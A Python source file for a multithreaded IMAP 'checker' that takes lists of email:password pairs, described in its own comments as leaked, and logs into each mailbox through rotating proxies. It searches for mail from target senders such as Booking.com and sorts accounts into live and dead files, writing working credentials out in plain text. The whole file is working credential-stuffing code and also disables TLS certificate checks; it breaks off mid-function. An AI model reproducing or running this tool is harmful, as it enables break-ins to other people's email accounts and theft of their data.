# imap_engine.py
# Core IMAP checking logic — ported from CLI main.py into a class-based engine.

import imaplib
import email
import email.utils
import os
import sys
import threading
import re
import json
import socket
import ssl as ssl_module
import base64
import time
from queue import Queue
from email.header import decode_header
from datetime import datetime, timedelta

from filelock import FileLock, Timeout

from imap_config import DEFAULT_IMAP_CONFIG, lookup_imap_config, IMAP_SUCCESS_PATH

socket.setdefaulttimeout(5)

# Regex
EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')

# Master imap_success.json — central PMJ database
MASTER_IMAP_SUCCESS_PATH = IMAP_SUCCESS_PATH
MASTER_IMAP_SUCCESS_LOCK_PATH = MASTER_IMAP_SUCCESS_PATH + ".lock"
MASTER_LOCK_TIMEOUT_SECONDS = 30

# Skip-domains file (project root) — user-editable list of substrings
# matched against email domain. Loaded per-job in ImapChecker.__init__.
SKIP_DOMAINS_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "skip_domains.json",
)
SKIP_DOMAINS_LOCK_PATH = SKIP_DOMAINS_PATH + ".lock"

# First-run seed only. NOT referenced from _worker (Requirement 5.2).
_DEFAULT_SKIP_SET = ["hotmail", "live", "msn", "outlook", "yahoo", "interia", "poczta.fm"]

# Whitespace detector for skip-entry validation (Requirement 9.3).
_WHITESPACE_RE = re.compile(r"\s")

# Subject-exclusion file (project root) — user-editable list of
# substring patterns matched (case-insensitively) against decoded
# email Subject. Loaded per-job in ImapChecker.__init__. Replaces
# the legacy OTP_SUBJECT_REGEX.
SUBJECT_EXCLUSION_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "subject_exclusion_list.json",
)
SUBJECT_EXCLUSION_LOCK_PATH = SUBJECT_EXCLUSION_PATH + ".lock"

# First-run seed only. NOT referenced from _worker (Requirement 5.2).
# This single substring is the invariant trailing phrase of every
# subject the previous OTP_SUBJECT_REGEX
# (^Booking\.com – \w+ is your verification code$) matched, so seeding
# with it preserves the prior exclusion semantics by default
# (Requirement 2.4, 12.1).
_DEFAULT_SUBJECT_EXCLUSION_PATTERNS = ["is your verification code"]

# Control-char detector for Requirement 9.4. Defined alongside
# subject-exclusion module state, NOT shared with _WHITESPACE_RE
# (custom-skip-domains).
_EXCLUSION_CONTROL_CHARS = {"\r", "\n", "\t", "\v", "\f", "\x00"}


def create_proxy_tunnel(proxy_host, proxy_port, proxy_user, proxy_pass, target_host, target_port, use_ssl=True):
    """Create an HTTP CONNECT tunnel through proxy to target IMAP server."""
    sock = socket.create_connection((proxy_host, proxy_port), timeout=10)
    # Build CONNECT request
    connect_str = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n"
    if proxy_user and proxy_pass:
        credentials = base64.b64encode(f"{proxy_user}:{proxy_pass}".encode()).decode()
        connect_str += f"Proxy-Authorization: Basic {credentials}\r\n"
    connect_str += "\r\n"
    sock.sendall(connect_str.encode())
    # Read response
    response = b""
    while b"\r\n\r\n" not in response:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Proxy closed connection")
        response += chunk
    status_line = response.split(b"\r\n")[0].decode()
    if "200" not in status_line:
        sock.close()
        raise ConnectionError(f"Proxy CONNECT failed: {status_line}")
    # Wrap with SSL if needed
    if use_ssl:
        # Permissive SSL context — allow legacy DH keys, weak ciphers
        # untuk IMAP server lawas (mis. Jepang DH 1024-bit).
        ctx = ssl_module.SSLContext(ssl_module.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl_module.CERT_NONE
        try:
            ctx.set_ciphers("ALL:@SECLEVEL=0")
        except Exception:
            pass
        sock = ctx.wrap_socket(sock, server_hostname=target_host)
    return sock


class _ProxiedIMAP4(imaplib.IMAP4):
    """IMAP4 that uses a pre-connected socket (e.g. from an HTTP CONNECT tunnel)."""
    def __init__(self, sock, host='', port=143):
        self._presock = sock
        super().__init__(host, port)

    def open(self, host='', port=143, timeout=None):
        self.host = host
        self.port = port
        self.sock = self._presock
        self.file = self.sock.makefile('rb')


def imap_via_proxy(proxy_config, server, port, use_ssl=True, timeout=10):
    """Create IMAP connection, optionally through proxy.

    Works for both direct and proxied connections. For proxied connections,
    uses _ProxiedIMAP4 with a pre-connected tunnel socket.
    """
    if not proxy_config:
        # Direct connection (no proxy)
        if port == 993 and use_ssl is not False:
            # Permissive SSL untuk legacy IMAP server
            _ctx = ssl_module.SSLContext(ssl_module.PROTOCOL_TLS_CLIENT)
            _ctx.check_hostname = False
            _ctx.verify_mode = ssl_module.CERT_NONE
            try:
                _ctx.set_ciphers("ALL:@SECLEVEL=0")
            except Exception:
                pass
            return imaplib.IMAP4_SSL(server, port, timeout=timeout, ssl_context=_ctx)
        elif use_ssl is False:
            return imaplib.IMAP4(server, port, timeout=timeout)
        else:
            m = imaplib.IMAP4(server, port, timeout=timeout)
            m.starttls()
            return m

    # Proxied connection via HTTP CONNECT tunnel
    is_ssl = (port == 993 and use_ssl is not False)
    tunnel_sock = create_proxy_tunnel(
        proxy_config["host"], int(proxy_config["port"]),
        proxy_config.get("user", ""), proxy_config.get("pass", ""),
        server, port, use_ssl=is_ssl
    )
    tunnel_sock.settimeout(timeout)

    if is_ssl:
        # Socket already SSL-wrapped by create_proxy_tunnel
        return _ProxiedIMAP4(tunnel_sock, server, port)
    elif use_ssl is False:
        return _ProxiedIMAP4(tunnel_sock, server, port)
    else:
        # STARTTLS: connect plain first, then upgrade
        m = _ProxiedIMAP4(tunnel_sock, server, port)
        m.starttls()
        return m


def decode_mime_words(s):
    if not s:
        return ""
    decoded_words = []
    for word_bytes, charset in decode_header(s):
        try:
            if isinstance(word_bytes, bytes):
                decoded_words.append(word_bytes.decode(charset or 'utf-8', errors='replace'))
            else:
                decoded_words.append(word_bytes)
        except Exception:
            if isinstance(word_bytes, bytes):
                decoded_words.append(word_bytes.decode('ascii', errors='replace'))
            else:
                decoded_words.append(str(word_bytes) if word_bytes is not None else "[decoding-error]")
    return "".join(decoded_words)


def parse_accounts(text):
    """Parse accounts from text (email:password per line).

    Format requirement: each non-empty line must be ``email:password`` —
    lines without a colon, with a malformed email, or starting with ``#``
    are silently dropped.

    Deduplication: emails are compared case-insensitively. The FIRST
    occurrence of each email is kept; every subsequent line with the same
    email (regardless of whether its password matches) is dropped. This
    handles the common case where the same email appears multiple times in
    a list with different leaked passwords — only one credential per
    mailbox is checked.

    Returns the deduplicated list of ``{"email": ..., "password": ...}``
    dicts in the order they first appeared in the input.
    """
    accounts = []
    seen_emails = set()  # lowercased emails for case-insensitive dedup
    for line in text.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        parts = line.split(":", 1)
        if len(parts) != 2:
            continue
        email_addr = parts[0].strip()
        password = parts[1].strip()
        if not EMAIL_REGEX.match(email_addr):
            continue
        email_key = email_addr.lower()
        if email_key in seen_emails:
            continue
        seen_emails.add(email_key)
        accounts.append({
            "email": email_addr,
            "password": password,
        })
    return accounts


def parse_senders(text):
    """Parse target senders from text (one per line).
    Supports:
    - Full email: noreply@booking.com (exact match)
    - Domain pattern: @booking.com (matches any sender from that domain)
    """
    senders = []
    for line in text.strip().splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            senders.append(line)
    return senders


def parse_proxies(text):
    """Parse proxy list from text. Supports formats:
    - user:pass@host:port
    - host:port:user:pass
    - host:port (no auth)
    One proxy per line.
    """
    proxies = []
    for line in text.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        proxy = _parse_single_proxy(line)
        if proxy:
            proxies.append(proxy)
    return proxies


def _parse_single_proxy(line):
    """Parse a single proxy line into {host, port, user, pass}."""
    # Format 1: user:pass@host:port
    if '@' in line:
        auth_part, server_part = line.rsplit('@', 1)
        if ':' in auth_part and ':' in server_part:
            user, password = auth_part.split(':', 1)
            host, port_str = server_part.rsplit(':', 1)
            try:
                return {"host": host, "port": int(port_str), "user": user, "pass": password}
            except ValueError:
                return None

    parts = line.split(':')
    # Format 2: host:port:user:pass
    if len(parts) >= 4:
        try:
            port = int(parts[1])
            return {"host": parts[0], "port": port, "user": parts[2], "pass": ':'.join(parts[3:])}
        except ValueError:
            pass

    # Format 3: host:port (no auth)
    if len(parts) == 2:
        try:
            return {"host": parts[0], "port": int(parts[1]), "user": "", "pass": ""}
        except ValueError:
            pass

    return None


def sender_matches(from_address, target_senders):
    """Check if from_address matches any of the target senders.
    Supports both exact email match and @domain pattern match.
    """
    if not from_address:
        return False
    from_lower = from_address.lower()
    for target in target_senders:
        t = target.lower().strip()
        if t.startswith("@"):
            # Domain match: @booking.com matches noreply@booking.com
            if from_lower.endswith(t):
                return True
        else:
            # Exact match
            if from_lower == t:
                return True
    return False


def _atomic_update_master(updater_fn):
    """Atomically read-modify-write the master ``imap_success.json``.

    Workflow:

    1. Acquire a cross-process :class:`filelock.FileLock` on
       ``MASTER_IMAP_SUCCESS_LOCK_PATH`` (with timeout
       ``MASTER_LOCK_TIMEOUT_SECONDS``).
    2. Load the current master into a ``dict``. If the file is missing or
       cannot be parsed, fall back to ``{}`` (matches
       ``_load_imap_success_config`` behavior).
    3. Call ``updater_fn(current)`` — the callback mutates the dict in
       place and returns ``True`` iff something changed. If it returns
       ``False``, this helper returns ``False`` immediately without
       touching disk (idempotent skip).
    4. Otherwise, write the updated dict to ``MASTER_IMAP_SUCCESS_PATH +
       ".tmp"`` (UTF-8, ``indent=2``), ``flush()`` + ``os.fsync()``, then
       call ``os.replace`` to atomically rename it over the master.
    5. Return ``True``.

    Args:
        updater_fn: Callable taking the current master ``dict`` and
            returning ``True`` iff it mutated the dict.

    Returns:
        ``True`` if the master file was rewritten on disk, ``False`` if
        ``updater_fn`` reported no change.

    Raises:
        filelock.Timeout: If the file lock cannot be acquired within
            ``MASTER_LOCK_TIMEOUT_SECONDS``. Propagated to the caller.
        OSError: If reading/writing the master or its tmp file fails
            (disk full, permission denied, ``os.replace`` failure, etc.).
            Propagated to the caller.
    """
    lock = FileLock(MASTER_IMAP_SUCCESS_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)
    with lock:
        # 1. Load current master (preserves existing fallback-to-empty behavior).
        current = {}
        if os.path.exists(MASTER_IMAP_SUCCESS_PATH):
            try:
                with open(MASTER_IMAP_SUCCESS_PATH, "r", encoding="utf-8") as f:
                    current = json.load(f)
            except Exception:
                current = {}

        # 2. Mutate in place; updater returns True iff something changed.
        changed = updater_fn(current)
        if not changed:
            return False  # idempotent skip

        # 3. Write to tmp in the same directory as the master.
        tmp_path = MASTER_IMAP_SUCCESS_PATH + ".tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(current, f, indent=2)
            f.flush()
            os.fsync(f.fileno())

        # 4. Atomic rename (POSIX & Windows: os.replace overwrites target).
        os.replace(tmp_path, MASTER_IMAP_SUCCESS_PATH)
        return True


def _normalize_skip_entries(raw):
    """Normalize per Requirement 4.1: strip → lower → drop-empty → dedupe (preserve first-occurrence order)."""
    seen = set()
    out = []
    for entry in raw:
        norm = entry.strip().lower()
        if not norm:
            continue
        if norm in seen:
            continue
        seen.add(norm)
        out.append(norm)
    return out


def _validate_skip_entries(raw):
    """Validate per Requirement 9.1-9.3 with short-circuit; all-or-nothing per 9.5.

    Returns ``(valid_normalized, rejected_raw)``. ``rejected_raw`` entries
    are reported as-sent (no strip/lower), preserving first-occurrence
    order, including duplicates (Requirement 9.4).
    """
    rejected = []
    valid_pre_dedupe = []
    for entry in raw:
        stripped = entry.strip()
        # Check 1: empty after strip
        if stripped == "":
            rejected.append(entry)
            continue
        # Check 2: length > 255 after strip
        if len(stripped) > 255:
            rejected.append(entry)
            continue
        # Check 3: contains whitespace after strip (\s = ASCII + Unicode)
        if _WHITESPACE_RE.search(stripped):
            rejected.append(entry)
            continue
        valid_pre_dedupe.append(entry)
    if rejected:
        return [], rejected
    return _normalize_skip_entries(valid_pre_dedupe), []


def _save_skip_domains(value):
    """Atomically write a list[str] to ``SKIP_DOMAINS_PATH`` under ``FileLock``.

    Caller is responsible for normalization + validation. This helper
    only does the atomic tmp + fsync + ``os.replace`` under
    ``FileLock(SKIP_DOMAINS_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)``.
    Propagates ``filelock.Timeout`` and ``OSError`` to the caller.
    """
    lock = FileLock(SKIP_DOMAINS_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)
    with lock:
        tmp_path = SKIP_DOMAINS_PATH + ".tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(value, f, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_path, SKIP_DOMAINS_PATH)


def _load_skip_domains():
    """Load the skip-domains list, seeding ``_DEFAULT_SKIP_SET`` on first run.

    Acquires ``FileLock(SKIP_DOMAINS_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)``.

    - Missing file → write ``_DEFAULT_SKIP_SET`` via the same atomic
      tmp + fsync + ``os.replace`` sequence as ``_save_skip_domains``
      and return ``list(_DEFAULT_SKIP_SET)``.
    - Corrupt file (JSON error or not ``list[str]``) → return ``[]``
      WITHOUT rewriting (Requirement 2.3).
    - ``filelock.Timeout`` propagates to the caller.
    """
    lock = FileLock(SKIP_DOMAINS_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)
    with lock:
        if not os.path.exists(SKIP_DOMAINS_PATH):
            tmp_path = SKIP_DOMAINS_PATH + ".tmp"
            with open(tmp_path, "w", encoding="utf-8") as f:
                json.dump(list(_DEFAULT_SKIP_SET), f, indent=2)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp_path, SKIP_DOMAINS_PATH)
            return list(_DEFAULT_SKIP_SET)
        try:
            with open(SKIP_DOMAINS_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            return []
        if not isinstance(data, list) or not all(isinstance(x, str) for x in data):
            return []
        return data


def _has_control_char(s):
    """True iff s contains a control character per Requirement 9.4.

    Definition: c in {"\\r", "\\n", "\\t", "\\v", "\\f", "\\x00"} OR
    (ord(c) < 0x20 AND c != " "). Internal ASCII space U+0020 is
    explicitly allowed.
    """
    for c in s:
        if c in _EXCLUSION_CONTROL_CHARS:
            return True
        if ord(c) < 0x20 and c != " ":
            return True
    return False


def _normalize_exclusion_entries(raw):
    """Normalize per Requirement 4.1: strip → lower → drop-empty →
    dedupe (preserve first-occurrence order). Internal whitespace
    inside an entry is preserved intact (Requirement 4.3).
    """
    seen = set()
    out = []
    for entry in raw:
        norm = entry.strip().lower()
        if not norm:
            continue
        if norm in seen:
            continue
        seen.add(norm)
        out.append(norm)
    return out


def _validate_exclusion_entries(raw):
    """Validate per Requirement 9.1 with short-circuit; all-or-nothing
    per Requirement 9.6.

    Returns ``(valid_normalized, rejected_raw)``. ``rejected_raw``
    entries are reported as-sent (no strip/lower), preserving
    first-occurrence order, including duplicates (Requirement 9.5).
    """
    rejected = []
    valid_pre_dedupe = []
    for entry in raw:
        stripped = entry.strip()
        # Check 1 (Requirement 9.2): empty after strip
        if stripped == "":
            rejected.append(entry)
            continue
        # Check 2 (Requirement 9.3): length > 500 after strip
        if len(stripped) > 500:
            rejected.append(entry)
            continue
        # Check 3 (Requirement 9.4): contains control character
        if _has_control_char(stripped):
            rejected.append(entry)
            continue
        valid_pre_dedupe.append(entry)
    if rejected:
        return [], rejected
    return _normalize_exclusion_entries(valid_pre_dedupe), []


def _save_subject_exclusion_list(value):
    """Atomically write ``list[str]`` to ``SUBJECT_EXCLUSION_PATH``
    under ``FileLock``.

    Caller is responsible for normalization + validation. This helper
    only does the atomic tmp + fsync + ``os.replace`` under
    ``FileLock(SUBJECT_EXCLUSION_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)``.
    Propagates ``filelock.Timeout`` and ``OSError`` to the caller.
    """
    lock = FileLock(SUBJECT_EXCLUSION_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)
    with lock:
        tmp_path = SUBJECT_EXCLUSION_PATH + ".tmp"
        with open(tmp_path, "w", encoding="utf-8") as f:
            json.dump(value, f, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_path, SUBJECT_EXCLUSION_PATH)


def _load_subject_exclusion_list():
    """Load subject-exclusion list, seeding ``_DEFAULT_SUBJECT_EXCLUSION_PATTERNS``
    on first run.

    Acquires ``FileLock(SUBJECT_EXCLUSION_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)``.

    - Missing file → write ``_DEFAULT_SUBJECT_EXCLUSION_PATTERNS`` via
      the same atomic tmp + fsync + ``os.replace`` sequence as
      ``_save_subject_exclusion_list`` and return
      ``list(_DEFAULT_SUBJECT_EXCLUSION_PATTERNS)`` (Requirement 2.1, 12.4).
    - Corrupt file (JSON error or not ``list[str]``) → return ``[]``
      WITHOUT rewriting (Requirement 2.3, 5.4).
    - ``filelock.Timeout`` propagates to the caller (Requirement 3.4).
    """
    lock = FileLock(SUBJECT_EXCLUSION_LOCK_PATH, timeout=MASTER_LOCK_TIMEOUT_SECONDS)
    with lock:
        if not os.path.exists(SUBJECT_EXCLUSION_PATH):
            tmp_path = SUBJECT_EXCLUSION_PATH + ".tmp"
            with open(tmp_path, "w", encoding="utf-8") as f:
                json.dump(list(_DEFAULT_SUBJECT_EXCLUSION_PATTERNS), f, indent=2)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp_path, SUBJECT_EXCLUSION_PATH)
            return list(_DEFAULT_SUBJECT_EXCLUSION_PATTERNS)
        try:
            with open(SUBJECT_EXCLUSION_PATH, "r", encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            return []
        if not isinstance(data, list) or not all(isinstance(x, str) for x in data):
            return []
        return data


def _subject_excluded(subject, patterns):
    """Return True iff any pattern is a substring of ``subject.lower()``.

    Assumes ``patterns`` has already been lowercased by the loader
    (Requirement 4.4) — does NOT lowercase ``patterns`` again.
    Lowercases ``subject`` exactly once, before the ``in`` check
    (Requirement 6.1, 6.5).

    Special case (Requirement 6.2): when ``patterns == []``, ``any``
    over an empty iterable is False, so no email is excluded.
    """
    s = subject.lower()
    return any(p in s for p in patterns)


def _escape_imap_string(s: str) -> str:
    """Escape a string for use inside an IMAP quoted-string literal.

    Per RFC 3501 §4.3, a quoted string in the IMAP protocol is delimited
    by ``"`` and any literal backslash (``\\``) or double quote (``"``)
    inside it must be escaped with a leading backslash. This helper
    applies those two substitutions in the correct order:

    1. ``\\`` → ``\\\\``  (replace backslashes first)
    2. ``"``  → ``\\"``   (then replace quotes)

    The order matters: doing it the other way around would re-escape the
    backslashes that were just inserted by the quote replacement. For
    example, an input ``\\"`` (backslash + quote) must become ``\\\\\\"``
    (escaped backslash + escaped quote), not ``\\\\\\\\"``.

    For inputs without any ``\\`` or ``"`` the function is a no-op,
    so existing IMAP ``SEARCH`` criteria built from ASCII-only senders
    and keywords remain byte-identical to the pre-fix behavior.
    """
    return s.replace("\\", "\\\\").replace('"', '\\"')


class ImapChecker:
    def __init__(self, job_id, results_dir, accounts, target_senders=None, keywords=None, search_days=365, max_threads=20, proxy_config=None, proxy_list=None):
        self.job_id = job_id
        self.results_dir = results_dir
        self.accounts = accounts
        self.target_senders = target_senders or []
        self.keywords = keywords or []
        self.search_days = search_days
        self.max_threads = max_threads

        # Proxy: support both single proxy_config (backward compat) and proxy_list
        if proxy_list:
            self.proxy_list = proxy_list
        elif proxy_config:
            self.proxy_list = [proxy_config]
        else:
            self.proxy_list = []
        self._proxy_idx = 0
        self._proxy_idx_lock = threading.Lock()

        self.search_since_date = (datetime.now() - timedelta(days=search_days)).strftime('%d-%b-%Y')

        os.makedirs(self.results_dir, exist_ok=True)

        # Result files
        self.live_file = os.path.join(self.results_dir, "live.txt")
        self.noemail_file = os.path.join(self.results_dir, "noemail.txt")
        self.die_file = os.path.join(self.results_dir, "die.txt")
        self.unreg_file = os.path.join(self.results_dir, "unreg.txt")
        self.noimap_file = os.path.join(self.results_dir, "noimap.txt")
        self.domain_skip_file = os.path.join(self.results_dir, "domain_skipped.txt")

        # Locks
        self.live_lock = threading.Lock()
        self.noemail_lock = threading.Lock()
        self.die_lock = threading.Lock()
        self.unreg_lock = threading.Lock()
        self.noimap_lock = threading.Lock()
        self.domain_skip_lock = threading.Lock()
        self.imap_config_lock = threading.Lock()

        # State
        self.unreg_domains = set()
        self.noimap_domains = set()
        self.imap_success_config = self._load_imap_success_config()
        # MX cache: domain -> (has_mx, mx_str). Hindari 1000x DNS query
        # untuk domain yang sama. Thread-safe.
        self._mx_cache = {}
        self._mx_cache_lock = threading.Lock()
        # Limit concurrent DNS MX lookup ke 50 — kalau 1000 thread
        # simultaneous query DNS, resolver (8.8.8.8) rate-limit/drop
        # query → MX lookup timeout → false-unreg.

        # Skip-domains snapshot for this job (Requirement 5.1, 5.3).
        # Loaded BEFORE any worker thread is spawned in run() so the snapshot
        # is fixed for the lifetime of the job (non-retroactive to admin edits).
        try:
            self.skip_domain_keywords = _load_skip_domains()
        except Timeout:
            # Requirement 3.4(b): fallback to default in-memory; do NOT raise.
            print(
                "[imap_engine] skip-domains lock timeout, falling back to default in-memory",
                file=sys.stderr,
            )
            self.skip_domain_keywords = list(_DEFAULT_SKIP_SET)

        # Subject-exclusion snapshot for this job (Requirement 5.1, 5.3).
        # Loaded BEFORE any worker thread is spawned in run() so the
        # snapshot is fixed for the lifetime of the job (non-retroactive
        # to admin edits — Requirement 12.3).
        try:
            self.subject_exclusion_patterns = _load_subject_exclusion_list()
        except Timeout:
            # Requirement 3.4(b): fallback to default in-memory; do NOT
            # raise from constructor.
            print(
                "[imap_engine] subject-exclusion-list lock timeout, "
                "falling back to default in-memory",
                file=sys.stderr,
            )
            self.subject_exclusion_patterns = list(_DEFAULT_SUBJECT_EXCLUSION_PATTERNS)

        # Progress tracking
        self.total = len(accounts)
        self.checked = 0
        self.live_count = 0
        self.noemail_count = 0
        self.die_count = 0
        self.unreg_count = 0
        self.noimap_count = 0
        self.skipped_count = 0
        self.progress_lock = threading.Lock()

        # Live accounts list (for real-time display on UI)
        self.live_accounts = []
        self.live_accounts_lock = threading.Lock()

        # Stop flag
        self._stop_event = threading.Event()
        self._queue = None  # Set during run()

        # Status: idle, running, done, stopped
        self.status = "idle"

    def _get_proxy(self):
        """Get next proxy from the list (round-robin). Returns None if no proxies."""
        if not self.proxy_list:
            return None
        with self._proxy_idx_lock:
            proxy = self.proxy_list[self._proxy_idx % len(self.proxy_list)]
            self._proxy_idx += 1
            return proxy

    def stop(self):
        """Force stop: immediately set status, drain queue, stop all workers."""
        self._stop_event.set()
        self.status = "stopped"
        # Drain the queue so queue.join() unblocks immediately
        if self._queue is not None:
            while not self._queue.empty():
                try:
                    self._queue.get_nowait()
                    self._queue.task_done()
                except Exception:
                    break

    @property
    def is_stopped(self):
        return self._stop_event.is_set()

    def _load_imap_success_config(self):
        if os.path.exists(MASTER_IMAP_SUCCESS_PATH):
            try:
                with open(MASTER_IMAP_SUCCESS_PATH, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception:
                return {}
        return {}

    def _update_imap_config(self, domain, config_data):
        with self.imap_config_lock:
            def updater(current):
                if current.get(domain) == config_data:
                    return False
                current[domain] = config_data
                return True

            try:
                changed = _atomic_update_master(updater)
            except Timeout:
                print(f"[imap_engine] master lock timeout, skip update for {domain}", file=sys.stderr)
                return
            except OSError as e:
                print(f"[imap_engine] master write failed for {domain}: {e}", file=sys.stderr)
                return

            if changed:
                self.imap_success_config[domain] = config_data

    def _write_live(self, email_addr, password, emails_found):
        with self.live_lock:
            num_w, date_w, from_w, subj_w = 3, 18, 30, 45
            header = f"    | {'No.':<{num_w}} | {'Date':<{date_w}} | {'From':<{from_w}} | {'Subject':<{subj_w}} |"
            sep = f"    |{'-'*num_w}-|-{'-'*date_w}-|-{'-'*from_w}-|-{'-'*subj_w}-|"

            if not os.path.exists(self.live_file):
                with open(self.live_file, 'w', encoding='utf-8') as f:
                    f.write("=" * 116 + "\n")
                    f.write("📌 EMAIL CHECKER REPORT - LIVE ACCOUNTS WITH TARGET EMAILS 📌\n")
                    f.write("=" * 116 + "\n\n")

            with open(self.live_file, 'a', encoding='utf-8') as f:
                f.write(f"[+] Account: {email_addr}:{password}\n")
                f.write(f"    Ditemukan {len(emails_found)} email target sejak {self.search_since_date}:\n")
                f.write(header + "\n")
                f.write(sep + "\n")

                for i, info in enumerate(emails_found, 1):
                    try:
                        dt = email.utils.parsedate_to_datetime(str(info['date']))
                        fmt_date = dt.strftime('%d-%b-%Y %H:%M')
                    except Exception:
                        fmt_date = str(info['date'])
                    if len(fmt_date) > date_w:
                        fmt_date = fmt_date[:date_w - 3] + "..."

                    raw_from = str(info['from'])
                    _name, from_addr = email.utils.parseaddr(raw_from)
                    fmt_from = raw_from
                    if from_addr and sender_matches(from_addr, self.target_senders):
                        fmt_from = f"<{from_addr}>"

                    subject = str(info['subject'])
                    f.write(f"    | {str(i):<{num_w}} | {fmt_date:<{date_w}} | {fmt_from:<{from_w}} | {subject:<{subj_w}} |\n")

                f.write(sep + "\n\n")

        # Add to live accounts list for UI display
        email_summaries = []
        for info in emails_found:  # Send ALL emails to frontend
            _name, from_addr = email.utils.parseaddr(str(info.get('from', '')))
            # Format date
            try:
                dt = email.utils.parsedate_to_datetime(str(info.get('date', '')))
                fmt_date = dt.strftime('%d-%b-%Y %H:%M')
            except Exception:
                fmt_date = str(info.get('date', ''))
            email_summaries.append({
                "from": from_addr or str(info.get('from', '')),
                "subject": str(info.get('subject', '')),
                "date": fmt_date,
            })

        with self.live_accounts_lock:
            self.live_accounts.append({
                "account": email_addr,
                "password": password,
                "email_count": len(emails_found),
                "emails": email_summaries,
            })

    def _write_noemail(self, email_addr, password):
        with self.noemail_lock:
            with open(self.noemail_file, 'a', encoding='utf-8') as f:
                f.write(f"{email_addr}:{password}\n")

    def _write_die(self, email_addr, password):
        with self.die_lock:
            with open(self.die_file, 'a', encoding='utf-8') as f:
                f.write(f"{email_addr}:{password}\n")

    def _write_unreg(self, domain):
        with self.unreg_lock:
            if domain not in self.unreg_domains:
                with open(self.unreg_file, 'a', encoding='utf-8') as f:
                    f.write(f"{domain}\n")
                self.unreg_domains.add(domain)

    def _write_noimap(self, domain):
        with self.noimap_lock:
            if domain not in self.noimap_domains:
                with open(self.noimap_file, 'a', encoding='utf-8') as f:
                    f.write(f"{domain}\n")
                self.noimap_domains.add(domain)

    def _write_domain_skip(self, email_addr, password):
        with self.domain_skip_lock:
            with open(self.domain_skip_file, 'a', encoding='utf-8') as f:
                f.write(f"{email_addr}:{password}\n")

    def _update_progress(self, category):
        with self.progress_lock:
            self.checked += 1
            if category == "live":
                self.live_count += 1
            elif category == "noemail":
                self.noemail_count += 1
            elif category == "die":
                self.die_count += 1
            elif category == "unreg":
                self.unreg_count += 1
            elif category == "noimap":
                self.noimap_count += 1
            elif category == "skipped":
                self.skipped_count += 1

    def get_progress(self):
        with self.progress_lock:
            pct = (self.checked / self.total * 100) if self.total > 0 else 0
            data = {
                "status": self.status,
                "total": self.total,
                "checked": self.checked,
                "percentage": round(pct, 1),
                "live": self.live_count,
                "noemail": self.noemail_count,
                "die": self.die_count,
                "unreg": self.unreg_count,
                "noimap": self.noimap_count,
                "skipped": self.skipped_count,
            }

        # Include live accounts for UI display
        with self.live_accounts_lock:
            data["live_accounts"] = list(self.live_accounts)

        return data

    @staticmethod
    def _recv_imap_banner(sock, timeout=2):
        """Baca IMAP greeting dari socket dengan loop.

        IMAP server kirim greeting ``* OK ...`` setelah connect. Greeting
        bisa datang dalam beberapa packet atau tertunda (terutama saat
        beban concurrency tinggi). Loop recv sampai ketemu ``* OK`` /
        ``IMAP`` atau sampai timeout.
        """
        sock.settimeout(timeout)
        chunks = b""
        import time as _t
        end = _t.monotonic() + timeout
        while _t.monotonic() < end:
            try:
                data = sock.recv(512)
            except socket.timeout:
                break
            except OSError:
                break
            if not data:
                break
            chunks += data
            b = chunks.decode("utf-8", errors="replace").upper()
            if "* OK" in b or "IMAP" in b:
                break
        banner = chunks.decode("utf-8", errors="replace")
        b = banner.upper()
        return ("* OK" in b or "IMAP" in b), banner

    @staticmethod
    def _imap_banner_ok(server, port, proxy=None, timeout=2):
        """Cek apakah server:port punya IMAP banner (gak login).

        Return (True, ssl_flag) kalau banner IMAP valid; (False, None) kalau
        gagal connect / bukan IMAP. Dipakai untuk tentukan apakah IMAP server
        benar-benar ada — terpisah dari apakah login akun tertentu berhasil.
        """
        import ssl as _ssl
        is_ssl = port == 993
        try:
            if proxy:
                raw = create_proxy_tunnel(
                    proxy["host"], int(proxy["port"]),
                    proxy.get("user", ""), proxy.get("pass", ""),
                    server, port, use_ssl=is_ssl,
                )
                ok, _banner = ImapChecker._recv_imap_banner(raw, timeout=timeout)
                try:
                    raw.close()
                except Exception:
                    pass
                return ok, is_ssl
            else:
                sock = socket.create_connection((server, port), timeout=timeout)
                if is_ssl:
                    # Permissive SSL context untuk legacy IMAP server:
                    # - CERT_NONE: skip cert validation (self-signed OK)
                    # - set_ciphers ALL:@SECLEVEL=0: allow weak DH keys,
                    #   RC4, MD5, SSLv3 — banyak IMAP Jepang lawas pakai
                    #   DH 1024-bit yang default OpenSSL 3.x reject
                    #   (DH_KEY_TOO_SMALL error).
                    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    try:
                        ctx.set_ciphers("ALL:@SECLEVEL=0")
                    except Exception:
                        pass
